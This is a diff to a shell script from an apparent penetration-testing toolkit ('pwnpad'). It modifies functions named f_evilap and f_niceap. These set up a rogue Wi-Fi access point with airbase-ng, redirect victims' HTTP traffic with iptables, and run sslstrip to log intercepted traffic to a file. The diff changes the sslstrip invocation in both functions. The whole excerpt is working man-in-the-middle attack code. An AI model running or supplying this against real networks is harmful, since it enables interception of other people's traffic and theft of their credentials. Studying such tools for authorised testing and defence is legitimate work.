@@ -140,7 +140,9 @@ f_evilap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
 
   echo "Running sslstrip and saving output to "
-  python /opt/pwnpad/sslstrip/sslstrip.py-k -l 10000 & tail -f $logname
+  cd /opt/pwnpad/sslstrip
+  python sslstrip.py -a -w $logname & sleep 2;
+
 }
 
 #########################################
@@ -153,7 +155,6 @@ f_niceap(){
   #Start Airbase-ng with -P for preferred networks 
   airbase-ng -C 30 -c 3 -e "$ssid" -v mon0 > $logname 2>&1 &
   sleep 2
-
 
   #Bring up virtual interface at0
   ifconfig at0 up
@@ -171,7 +172,8 @@ f_niceap(){
   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
  
   echo "Running sslstrip and saving output to "
-  python /opt/pwnpad/sslstrip/sslstrip.py -k -l 10000 & tail -f $logname
+  cd /opt/pwnpad/sslstrip
+  python sslstrip.py -a -w $logname & sleep 2;
 }
 
 #########################################
